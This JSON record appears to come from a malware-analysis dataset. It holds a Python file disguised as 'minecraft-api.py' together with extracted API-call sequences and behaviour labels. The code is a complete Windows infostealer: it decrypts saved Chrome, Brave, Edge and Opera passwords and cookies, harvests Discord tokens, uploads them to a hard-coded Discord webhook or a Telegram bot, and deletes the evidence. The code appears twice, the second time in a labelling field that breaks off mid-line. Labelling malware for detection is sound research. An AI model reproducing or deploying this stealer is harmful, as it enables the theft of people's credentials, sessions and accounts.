[
  {
    "pyfile": "minecraft-api.py",
    "code_snippet": "import os\nimport re\nfrom base64 import b64decode\nfrom json import loads\nfrom shutil import copy2\nfrom sqlite3 import connect\n\nimport win32crypt\nfrom Cryptodome.Cipher import AES\nfrom requests import post\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\n\ntokenPaths = {\n    'Discord': f\"{roaming}\\\\Discord\",\n    'Discord Canary': f\"{roaming}\\\\discordcanary\",\n    'Discord PTB': f\"{roaming}\\\\discordptb\",\n    'Google Chrome': f\"{local}\\\\Google\\\\Chrome\\\\User Data\\\\Default\",\n    'Opera': f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n    'Brave': f\"{local}\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\",\n    'Yandex': f\"{local}\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\",\n    'OperaGX': f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\"\n}\n\nbrowser_loc = {\n    \"Chrome\": f\"{local}\\\\Google\\\\Chrome\",\n    \"Brave\": f\"{local}\\\\BraveSoftware\\\\Brave-Browser\",\n    \"Edge\": f\"{local}\\\\Microsoft\\\\Edge\",\n    \"Opera\": f\"{roaming}\\\\Opera Software\\\\Opera Stable\",\n    \"OperaGX\": f\"{roaming}\\\\Opera Software\\\\Opera GX Stable\",\n}\n\nfileCookies = \"cooks_\" + os.getlogin() + \".txt\"\nfilePass = \"passes_\" + os.getlogin() + \".txt\"\nfileInfo = \"info_\" + os.getlogin() + \".txt\"\n\n# CHROME PROFILES\nfor i in os.listdir(browser_loc['Chrome'] + \"\\\\User Data\"):\n    if i.startswith(\"Profile \"):\n        browser_loc[\"ChromeP\"] = f\"{local}\\\\Google\\\\Chrome\\\\User Data\\\\{i}\"\n# DISCORD TOKENS\ndef decrypt_token(buff, master_key):\n    try:\n        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,\n                       buff[3:15]).decrypt(buff[15:])[:-16].decode()\n    except:\n        pass\n\n\ndef get_tokens(path):\n    cleaned = []\n    tokens = []\n    done = []\n    lev_db = f\"{path}\\\\Local Storage\\\\leveldb\\\\\"\n    loc_state = f\"{path}\\\\Local State\"\n    # new method with encryption\n    if os.path.exists(loc_state):\n        with open(loc_state, \"r\") as file:\n            key = loads(file.read())['os_crypt']['encrypted_key']\n        for file in os.listdir(lev_db):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"):\n                continue\n            else:\n                try:\n                    with open(lev_db + file, \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError:\n                    continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]\n\n    else:  # old method without encryption\n        for file_name in os.listdir(path):\n            try:\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                        for token in re.findall(regex, line):\n                            done.append(token)\n            except:\n                continue\n\n    return done\n\n\n# DECRYPT CIPHERS\ndef generate_cipher(aes_key, iv):\n    return AES.new(aes_key, AES.MODE_GCM, iv)\n\n\ndef decrypt_payload(cipher, payload):\n    return cipher.decrypt(payload)\n\n\n# DECRYPT BROWSER\ndef decrypt_browser(LocalState, LoginData, CookiesFile, name):\n    if os.path.exists(LocalState):\n        with open(LocalState) as f:\n            local_state = f.read()\n            local_state = loads(local_state)\n        master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n\n        if os.path.exists(LoginData):\n            copy2(LoginData, \"TempMan.db\")\n            with connect(\"TempMan.db\") as conn:\n                cur = conn.cursor()\n            cur.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n            with open(filePass, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, logins in enumerate(cur.fetchall()):\n                try:\n                    if not logins[0]:\n                        continue\n                    if not logins[1]:\n                        continue\n                    if not logins[2]:\n                        continue\n                    ciphers = logins[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f\"URL : {logins[0]}\\nName: {logins[1]}\\nPass: {dec_pass}\\n\\n\"\n                    with open(filePass, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"{name} Login Data file missing\\n\")\n        ######################################################################\n        if os.path.exists(CookiesFile):\n            copy2(CookiesFile, \"CookMe.db\")\n            with connect(\"CookMe.db\") as conn:\n                curr = conn.cursor()\n            curr.execute(\"SELECT host_key, name, encrypted_value, expires_utc FROM cookies\")\n            with open(fileCookies, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, cookies in enumerate(curr.fetchall()):\n                try:\n                    if not cookies[0]:\n                        continue\n                    if not cookies[1]:\n                        continue\n                    if not cookies[2]:\n                        continue\n                    if \"google\" in cookies[0]:\n                        continue\n                    ciphers = cookies[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f'URL : {cookies[0]}\\nName: {cookies[1]}\\nCook: {dec_pass}\\n\\n'\n                    with open(fileCookies, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"no {name} Cookie file\\n\")\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(f\"{name} Local State file missing\\n\")\n\n\n\n# PATH SHIT\ndef Local_State(path):\n    return f\"{path}\\\\User Data\\\\Local State\"\n\n\ndef Login_Data(path):\n    if \"Profile\" in path:\n        return f\"{path}\\\\Login Data\"\n    else:\n        return f\"{path}\\\\User Data\\\\Default\\\\Login Data\"\n\n\ndef Cookies(path):\n    if \"Profile\" in path:\n        return f\"{path}\\\\Network\\\\Cookies\"\n    else:\n        return f\"{path}\\\\User Data\\\\Default\\\\Network\\\\Cookies\"\n\n\ndef main_tokens():\n    for platform, path in tokenPaths.items():\n        if not os.path.exists(path):\n            continue\n        try:\n            tokens = set(get_tokens(path))\n        except:\n            continue\n        if not tokens:\n            continue\n        with open(fileInfo, \"a\") as f:\n            for i in tokens:\n                f.write(str(i) + \"\\n\")\n\n\ndef decrypt_files(path, browser):\n    if os.path.exists(path):\n        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(browser + \" not installed\\n\")\n\n\n# WEBHOOK\ndef post_to(file):\n    token = \"TELEGRAM TOKEN\"     # put your token in here, if you don't wanna use telegram leave it like it is\n    chat_id = \"TELEGRAM CHATID\"  # \"    chatid          \"                     telegram      \"\n    webhook_url = \"https://discordapp.com/api/webhooks/1097233590070300812/YX9qYsEi0yMX5gHppNUuzk9-C4P7ZeDHVeKvWioAyMXtBp5R-KcT0d4EDdhwygTqY7iq\"  # \"    webhook         \"                     discord       \"\n    # if you don't understand it you shouldn't use it\n\n    if token == \"TELEGRAM TOKEN\":  # don't change\n        pass\n    else:\n        if chat_id == \"TELEGRAM CHATID\":  # don't change\n            pass\n        else:\n            post(\"https://api.telegram.org/bot\" + token + \"/sendDocument\", data={'chat_id': chat_id},\n                 files={'document': open(file, 'rb')})\n\n    if webhook_url == \"WEBHOOK URL\":  # don't change\n        pass\n    else:\n        post(webhook_url, files={'files': open(file, 'rb')})\n\n\nfor_handler = (\n    fileInfo,\n    filePass,\n    fileCookies,\n    \"TempMan.db\",\n    \"CookMe.db\"\n)\n\n\ndef file_handler(file):\n    if os.path.exists(file):\n        if \".txt\" in file:\n            post_to(file)\n        os.remove(file)\n\n\ndef main():\n    for name, path in browser_loc.items():\n        decrypt_files(path, name)\n    main_tokens()\n    for i in for_handler:\n        file_handler(i)\n\n\nmain()",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.getenv",
        "os.getlogin",
        "os.getlogin",
        "os.getlogin",
        "os.listdir",
        "os.path.exists",
        "open",
        "json.loads",
        "os.listdir",
        "open",
        "re.findall",
        "base64.b64decode",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "AES.new",
        "Cryptodome.Cipher.AES.new.decrypt",
        "os.path.exists",
        "open",
        "open",
        "re.findall",
        "os.listdir",
        "open",
        "re.findall",
        "os.path.exists",
        "open",
        "json.loads",
        "base64.b64decode",
        "win32crypt.CryptUnprotectData",
        "os.path.exists",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "open",
        "sqlite3.Cursor.fetchall",
        "Cryptodome.Cipher.AES.new",
        "Cryptodome.Cipher.AES.new.decrypt",
        "open",
        "os.path.exists",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "open",
        "sqlite3.Cursor.fetchall",
        "Cryptodome.Cipher.AES.new",
        "Cryptodome.Cipher.AES.new.decrypt",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "shutil.copy2",
        "sqlite3.connect",
        "sqlite3.Connection.cursor",
        "sqlite3.Cursor.execute",
        "open",
        "sqlite3.Cursor.fetchall",
        "Cryptodome.Cipher.AES.new",
        "Cryptodome.Cipher.AES.new.decrypt",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "os.path.exists",
        "open",
        "requests.post",
        "open",
        "requests.post",
        "open",
        "os.path.exists",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "os.getenv('LOCALAPPDATA')",
        "os.getenv('APPDATA')",
        "os.getlogin()",
        "os.getlogin()",
        "os.getlogin()",
        "os.listdir(browser_loc['Chrome'] + \"\\User Data\")",
        "os.path.exists(loc_state)",
        "open(loc_state, \"r\")",
        "json.loads(file.read())",
        "os.listdir(lev_db)",
        "open(lev_db + file, \"r\", errors='ignore')",
        "re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x)",
        "base64.b64decode(token.split('dQw4w9WgXcQ:')[1])",
        "base64.b64decode(key)[5:]",
        "win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]",
        "AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15])",
        "AES.new(...).decrypt(buff[15:])[:-16].decode()",
        "os.path.exists(path)",
        "open(f'{path}\\{file_name}', errors='ignore')",
        "re.findall(regex, line)",
        "os.path.exists(LocalState)",
        "open(LocalState)",
        "json.loads(local_state)",
        "base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])",
        "win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]",
        "os.path.exists(LoginData)",
        "shutil.copy2(LoginData, \"TempMan.db\")",
        "sqlite3.connect(\"TempMan.db\")",
        "conn.cursor()",
        "cur.execute(\"SELECT origin_url, username_value, password_value FROM logins\")",
        "open(filePass, \"a\")",
        "cur.fetchall()",
        "Cryptodome.Cipher.AES.new(master_key, AES.MODE_GCM, init_vector)",
        "Cryptodome.Cipher.AES.new(...).decrypt(enc_pass).decode()",
        "open(filePass, \"a\")",
        "os.path.exists(CookiesFile)",
        "shutil.copy2(CookiesFile, \"CookMe.db\")",
        "sqlite3.connect(\"CookMe.db\")",
        "conn.cursor()",
        "curr.execute(\"SELECT host_key, name, encrypted_value, expires_utc FROM cookies\")",
        "open(fileCookies, \"a\")",
        "curr.fetchall()",
        "Cryptodome.Cipher.AES.new(master_key, AES.MODE_GCM, init_vector)",
        "Cryptodome.Cipher.AES.new(...).decrypt(enc_pass).decode()",
        "open(fileCookies, \"a\")",
        "os.path.exists(LocalState)",
        "open(fileInfo, \"a\")",
        "os.path.exists(LoginData)",
        "open(fileInfo, \"a\")",
        "os.path.exists(CookiesFile)",
        "open(fileInfo, \"a\")",
        "os.path.exists(path)",
        "decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)",
        "os.path.exists(file)",
        "open(file, 'rb')",
        "requests.post(\"https://api.telegram.org/bot\" + token + \"/sendDocument\", data={'chat_id': chat_id}, files={'document': open(file, 'rb')})",
        "open(file, 'rb')",
        "requests.post(webhook_url, files={'files': open(file, 'rb')})",
        "os.path.exists(file)",
        "os.remove(file)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new",
          "id": "init_aes_cipher",
          "description": "Initializes AES cipher with provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "win32crypt.CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new",
          "id": "init_aes_cipher",
          "description": "Initializes AES cipher with provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "sqlite3.connect",
          "id": "open_sqlite_db",
          "description": "Opens SQLite database file",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Connection.cursor",
          "id": "create_sql_cursor",
          "description": "Creates cursor object for SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "sqlite3.Cursor.execute",
          "id": "execute_sql_query",
          "description": "Executes SQL query on SQLite connection",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "sqlite3.Cursor.fetchall",
          "id": "fetch_sql_rows",
          "description": "Fetches all rows from last executed query",
          "first_id": "persistence_stealth",
          "second_id": "data_storage",
          "third_id": "database_operations"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new",
          "id": "init_aes_cipher",
          "description": "Initializes AES cipher with provided key",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "encryption_initialization"
        },
        {
          "api_name": "Cryptodome.Cipher.AES.new.decrypt",
          "id": "decrypt_aes_data",
          "description": "Decrypts data using initialized AES cipher",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport re\nfrom base64 import b64decode\nfrom json import loads\nfrom shutil import copy2\nfrom sqlite3 import connect\nimport win32crypt\nfrom Cryptodome.Cipher import AES\nfrom requests import post\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\n\nfileCookies = \"cooks_\" + os.getlogin() + \".txt\"\nfilePass = \"passes_\" + os.getlogin() + \".txt\"\nfileInfo = \"info_\" + os.getlogin() + \".txt\"\n\nfor i in os.listdir(browser_loc['Chrome'] + \"\\User Data\"):\n    if i.startswith(\"Profile \"):\n        browser_loc[\"ChromeP\"] = f\"{local}\\\\Google\\\\Chrome\\\\User Data\\\\{i}\"\n\ndef decrypt_token(buff, master_key):\n    try:\n        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,\n                       buff[3:15]).decrypt(buff[15:])[:-16].decode()\n    except:\n        pass\n\ndef get_tokens(path):\n    cleaned = []\n    tokens = []\n    done = []\n    lev_db = f\"{path}\\\\Local Storage\\\\leveldb\\\\\"\n    loc_state = f\"{path}\\\\Local State\"\n    if os.path.exists(loc_state):\n        with open(loc_state, \"r\") as file:\n            key = loads(file.read())['os_crypt']['encrypted_key']\n        for file in os.listdir(lev_db):\n            if not file.endswith(\".ldb\") and file.endswith(\".log\"):\n                continue\n            else:\n                try:\n                    with open(lev_db + file, \"r\", errors='ignore') as files:\n                        for x in files.readlines():\n                            x.strip()\n                            for values in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", x):\n                                tokens.append(values)\n                except PermissionError:\n                    continue\n        for i in tokens:\n            if i.endswith(\"\\\\\"):\n                i.replace(\"\\\\\", \"\")\n            elif i not in cleaned:\n                cleaned.append(i)\n        for token in cleaned:\n            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]\n    else:\n        for file_name in os.listdir(path):\n            try:\n                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                    continue\n                for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                    for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):\n                        for token in re.findall(regex, line):\n                            done.append(token)\n            except:\n                continue\n    return done\n\ndef generate_cipher(aes_key, iv):\n    return AES.new(aes_key, AES.MODE_GCM, iv)\n\ndef decrypt_payload(cipher, payload):\n    return cipher.decrypt(payload)\n\ndef decrypt_browser(LocalState, LoginData, CookiesFile, name):\n    if os.path.exists(LocalState):\n        with open(LocalState) as f:\n            local_state = f.read()\n            local_state = loads(local_state)\n        master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n        master_key = master_key[5:]\n        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n        if os.path.exists(LoginData):\n            copy2(LoginData, \"TempMan.db\")\n            with connect(\"TempMan.db\") as conn:\n                cur = conn.cursor()\n            cur.execute(\"SELECT origin_url, username_value, password_value FROM logins\")\n            with open(filePass, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, logins in enumerate(cur.fetchall()):\n                try:\n                    if not logins[0]:\n                        continue\n                    if not logins[1]:\n                        continue\n                    if not logins[2]:\n                        continue\n                    ciphers = logins[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f\"URL : {logins[0]}\\nName: {logins[1]}\\nPass: {dec_pass}\\n\\n\"\n                    with open(filePass, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"{name} Login Data file missing\\n\")\n        if os.path.exists(CookiesFile):\n            copy2(CookiesFile, \"CookMe.db\")\n            with connect(\"CookMe.db\") as conn:\n                curr = conn.cursor()\n            curr.execute(\"SELECT host_key, name, encrypted_value, expires_utc FROM cookies\")\n            with open(fileCookies, \"a\") as f:\n                f.write(f\"*** {name} ***\\n\")\n            for index, cookies in enumerate(curr.fetchall()):\n                try:\n                    if not cookies[0]:\n                        continue\n                    if not cookies[1]:\n                        continue\n                    if not cookies[2]:\n                        continue\n                    if \"google\" in cookies[0]:\n                        continue\n                    ciphers = cookies[2]\n                    init_vector = ciphers[3:15]\n                    enc_pass = ciphers[15:-16]\n                    cipher = generate_cipher(master_key, init_vector)\n                    dec_pass = decrypt_payload(cipher, enc_pass).decode()\n                    to_print = f'URL : {cookies[0]}\\nName: {cookies[1]}\\nCook: {dec_pass}\\n\\n'\n                    with open(fileCookies, \"a\") as f:\n                        f.write(to_print)\n                except (Exception, FileNotFoundError):\n                    pass\n        else:\n            with open(fileInfo, \"a\") as f:\n                f.write(f\"no {name} 